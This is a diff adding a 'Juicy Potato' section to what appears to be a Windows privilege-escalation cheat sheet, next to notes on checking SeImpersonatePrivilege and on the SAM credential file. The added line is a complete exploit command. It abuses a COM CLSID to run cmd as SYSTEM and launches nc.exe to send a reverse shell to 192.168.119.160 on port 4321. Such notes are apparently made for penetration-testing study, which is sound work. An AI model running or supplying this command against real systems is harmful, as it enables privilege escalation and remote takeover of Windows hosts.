@@ -10,6 +10,11 @@ icacls "C:\Puppet"    # check path permission
 whoami /priv    # Look for SeImpersonatePrivilege > Juicy Potato
 ```
 
+### Juicy Potato
+```
+potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.160 4321" -t *
+```
+
 ### SAM (Security Account Manager)
 A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS) <br />
 Passwords are LM & NTLM hashed <br />
